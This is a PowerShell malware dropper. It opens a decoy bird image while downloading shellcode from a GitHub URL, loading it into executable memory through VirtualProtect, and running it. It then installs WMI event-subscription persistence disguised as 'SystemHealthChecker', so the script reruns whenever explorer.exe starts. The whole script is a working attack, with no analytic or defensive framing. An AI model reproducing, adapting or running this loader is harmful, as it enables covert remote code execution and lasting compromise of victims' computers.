try {
    # Download the image (decoy)
    $imageUrl = "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg"
    $imagePath = "$env:TEMP\blue-bird.jpg"
    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
    
    # Open the downloaded image (decoy)
    if (Test-Path $imagePath) {
        Start-Process $imagePath
    } else {
        Write-Host "Image download failed."
    }

    # Function to execute shellcode
    function Execute-Shellcode {
        # Download and load shellcode directly into memory
        $shellcodeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/loader.bin"
        $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content

        # Allocate memory for the shellcode
        $size = $shellcode.Length
        $address = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
        [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $address, $size)

        # Define the VirtualProtect function using P/Invoke
        $virtualProtect = @"
        using System;
        using System.Runtime.InteropServices;
        public class Win32 {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
"@
        Add-Type -TypeDefinition $virtualProtect

        # Mark the memory as executable
        $oldProtect = 0
        $protectResult = [Win32]::VirtualProtect($address, $size, 0x40, [ref]$oldProtect)  # 0x40 = PAGE_EXECUTE_READWRITE
        if (-not $protectResult) {
            throw "Failed to mark memory as executable."
        }

        # Create a delegate to the shellcode
        $shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($address, [type]::GetType("System.Action"))

        # Execute the shellcode
        $shellcodeDelegate.Invoke()

        # Free the allocated memory (optional, as the process may terminate)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($address)
    }

    # Execute the shellcode immediately
    Execute-Shellcode

    # Add persistence via WMI Event Subscription
    $wmiQuery = @"
    SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'
"@
    $wmiAction = @"
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"
"@
    $wmiFilter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
        Name = "SystemHealthCheckerFilter";
        EventNamespace = "root\cimv2";
        QueryLanguage = "WQL";
        Query = $wmiQuery;
    }
    $wmiConsumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
        Name = "SystemHealthCheckerConsumer";
        ExecutablePath = "powershell.exe";
        CommandLineTemplate = $wmiAction;
    }
    $wmiBinding = Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
        Filter = $wmiFilter;
        Consumer = $wmiConsumer;
    }

    Write-Host "[+] Persistence established via WMI Event Subscription."
}
catch {
    Write-Host "An error occurred: $_"
}